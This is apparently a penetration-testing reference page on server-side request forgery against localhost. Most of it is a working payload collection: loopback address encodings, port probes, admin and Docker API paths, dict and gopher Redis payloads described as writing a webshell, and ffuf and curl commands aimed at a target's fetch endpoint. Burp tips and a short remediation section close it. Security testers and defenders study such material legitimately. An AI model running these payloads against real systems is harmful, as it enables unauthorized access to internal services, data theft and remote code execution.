# SSRF to localhost / 127.0.0.1

## Overview
SSRF to localhost is the most fundamental exploitation path: forcing the server to make HTTP requests to itself (127.0.0.1, ::1, or the `localhost` hostname). Because the request comes from the server's own loopback interface, it bypasses network-level access controls — firewall rules, VPN requirements, IP allowlists — and can access administrative panels, management APIs, and development services that are intentionally bound to loopback only. This is a common first step after confirming SSRF, since every host has a loopback interface.

## How It Works
Applications frequently run companion services on loopback ports that are not exposed to the public network: admin panels on :8080, metrics endpoints on :9090, health/debug APIs on :9000, local Redis on :6379. When the main application fetches an attacker-supplied URL pointing to 127.0.0.1, the outgoing TCP connection comes from the loopback interface and the target service sees a connection from a trusted local address, often granting elevated access or skipping authentication entirely. Some frameworks (Django, Spring Boot, Express) expose admin/debug routes that respond differently — or are exclusively accessible — when the client IP is loopback.

## Impact
- Access admin panels and management consoles bound to loopback (e.g., Tomcat Manager, RabbitMQ management, Jenkins, Consul UI)
- Bypass per-endpoint IP-based authentication that trusts 127.0.0.1
- Reach internal APIs that only accept connections from localhost
- Interact with unauthenticated database management interfaces
- Exploit local services to achieve Remote Code Execution (e.g., Jenkins Script Console, Redis SLAVEOF)
- Read local application configuration via management APIs
- Trigger internal state changes (flush cache, reload config, run scripts)

## Where to Look
- URL parameters: `url=`, `host=`, `endpoint=`, `target=`, `proxy=`
- Webhook and integration configuration fields
- Image/file fetch by URL features
- "Test this URL" or "Validate connection" buttons
- Import/export features that accept remote URLs
- API documentation generators that fetch from a provided URL
- Any field where the server constructs and makes an HTTP request

## Testing Steps
1. Identify the injection point and confirm basic SSRF (OOB callback or reflected response).
2. Try all common localhost representations:
   - `http://127.0.0.1/`
   - `http://localhost/`
   - `http://0.0.0.0/`
   - `http://[::1]/`
3. Observe response: length, status code, body content — any difference from an invalid host confirms the server reached localhost.
4. Probe common localhost-only ports systematically (see payloads section).
5. For each open port, fetch relevant paths:
   - :8080 → /manager/html (Tomcat), /admin, /console
   - :9090 → /metrics, /targets (Prometheus)
   - :15672 → (RabbitMQ management UI)
   - :6379 → try dict protocol or Gopher
   - :2375 → /version, /containers/json (Docker API)
6. If responses are reflected, read sensitive data from admin interfaces.
7. If only status codes differ (blind SSRF), use port timing to enumerate open ports.
8. Attempt to interact with services through alternative protocols (dict://, gopher://).

## Payloads / Techniques

```
# === Localhost Representations ===
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://[::]/ 
http://0/
http://0x7f000001/       # Hex
http://2130706433/       # Decimal
http://0177.0.0.1/       # Octal
http://127.000.000.001/  # Zero-padded (some parsers)
http://127.1/            # Short form
http://127.0.1/          # Short form
http://localhost.localdomain/
http://ip6-localhost/

# === Common Localhost-Only Ports to Probe ===
http://127.0.0.1:21/     # FTP
http://127.0.0.1:22/     # SSH
http://127.0.0.1:23/     # Telnet
http://127.0.0.1:25/     # SMTP
http://127.0.0.1:80/     # HTTP
http://127.0.0.1:443/    # HTTPS
http://127.0.0.1:1433/   # MSSQL
http://127.0.0.1:2375/   # Docker API (unauthenticated)
http://127.0.0.1:2376/   # Docker API (TLS)
http://127.0.0.1:3000/   # Dev server / Grafana
http://127.0.0.1:3306/   # MySQL
http://127.0.0.1:4848/   # GlassFish Admin
http://127.0.0.1:5000/   # Flask dev / Docker Registry
http://127.0.0.1:5432/   # PostgreSQL
http://127.0.0.1:5601/   # Kibana
http://127.0.0.1:6379/   # Redis
http://127.0.0.1:7001/   # WebLogic
http://127.0.0.1:8000/   # Dev server
http://127.0.0.1:8080/   # Alt HTTP / Tomcat / Jenkins
http://127.0.0.1:8161/   # ActiveMQ console
http://127.0.0.1:8443/   # Alt HTTPS
http://127.0.0.1:8500/   # Consul HTTP
http://127.0.0.1:8888/   # Jupyter Notebook
http://127.0.0.1:9000/   # SonarQube / Portainer / MinIO
http://127.0.0.1:9090/   # Prometheus
http://127.0.0.1:9200/   # Elasticsearch HTTP
http://127.0.0.1:9300/   # Elasticsearch transport
http://127.0.0.1:11211/  # Memcached
http://127.0.0.1:15672/  # RabbitMQ Management
http://127.0.0.1:27017/  # MongoDB
http://127.0.0.1:28017/  # MongoDB Web Status
http://127.0.0.1:50070/  # Hadoop NameNode

# === Specific High-Value Paths ===

# Tomcat Manager (often on :8080)
http://127.0.0.1:8080/manager/html
http://127.0.0.1:8080/host-manager/html

# Jenkins Script Console
http://127.0.0.1:8080/script

# Docker API
http://127.0.0.1:2375/version
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json
http://127.0.0.1:2375/exec  # Can create privileged container

# Kubernetes API (inside cluster)
http://127.0.0.1:10250/pods  # kubelet API
http://127.0.0.1:10255/pods  # read-only kubelet API

# Elasticsearch
http://127.0.0.1:9200/_cat/indices?v
http://127.0.0.1:9200/_cluster/settings
http://127.0.0.1:9200/_nodes

# Redis via dict protocol
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/CONFIG GET dir

# Redis via Gopher (write webshell)
# Generate with Gopherus tool
gopher://127.0.0.1:6379/_...

# Consul KV store
http://127.0.0.1:8500/v1/kv/?recurse
http://127.0.0.1:8500/v1/agent/members
```

```bash
# Automated localhost port scan via SSRF
# Uses ffuf with a ports wordlist
seq 1 65535 > /tmp/ports.txt
ffuf -u "https://target.com/api/fetch?url=http://127.0.0.1:FUZZ/" \
  -w /tmp/ports.txt:FUZZ \
  -mc 200,301,302,403 \
  -fs 0 \
  -t 50

# Extract Elasticsearch indices via reflected SSRF
curl -s "https://target.com/api/proxy?url=http://127.0.0.1:9200/_cat/indices?v"

# Interact with Docker API via SSRF — list containers
curl -s "https://target.com/fetch?url=http://127.0.0.1:2375/containers/json"

# Read RabbitMQ management API
curl -s "https://target.com/fetch?url=http://127.0.0.1:15672/api/overview"
```

## Burp Suite Tips
- In **Intruder**, use a "Numbers" payload type from 1 to 65535 to scan all ports at `http://127.0.0.1:§PORT§/`. Set threads to 20–50. Filter results by response length or status code in the results tab.
- Enable **Response Filtering** in Intruder to show only results with specific strings (e.g., "200 OK" or service banners).
- Use **Repeater** to manually explore interesting ports once identified.
- **Compare Site Maps** (right-click a request > Send to Comparer) to highlight differences between responses from different internal port probes.
- When the response is a redirect, enable "Follow redirects" in Repeater options to see the final destination.
- Install the **SSRF King** extension for automated SSRF payload generation and testing.

## Tools
- Burp Suite Pro (Intruder for port scanning, Repeater for exploration)
- SSRFmap — automated exploitation including localhost scanning
- Gopherus — generate Gopher protocol payloads for Redis, MySQL, SMTP, etc.
- ffuf — fast web fuzzer for port enumeration via SSRF
- interactsh — OOB detection
- Docker client (once Docker API confirmed accessible)
- redis-cli (once Redis accessible via SSRF + Gopher)

## Remediation
- Implement strict URL validation that blocks `127.0.0.1`, `localhost`, `0.0.0.0`, `::1`, and all their representations (decimal, hex, octal, short forms).
- After resolving DNS, check the resulting IP against a denylist of loopback and RFC1918 ranges before connecting.
- Bind management and internal services to specific non-loopback interfaces only if they must be on the network, or use unix domain sockets.
- Apply authentication to all admin interfaces even when accessible only on loopback — defense in depth.
- Use network namespaces or containers to isolate the application from locally running services it should not access.
- Run services like Redis with a `bind 127.0.0.1` AND `requirepass` configuration — do not rely on network isolation alone.

## References
https://portswigger.net/web-security/ssrf#ssrf-attacks-against-the-server-itself
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
https://github.com/tarunkant/Gopherus
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher
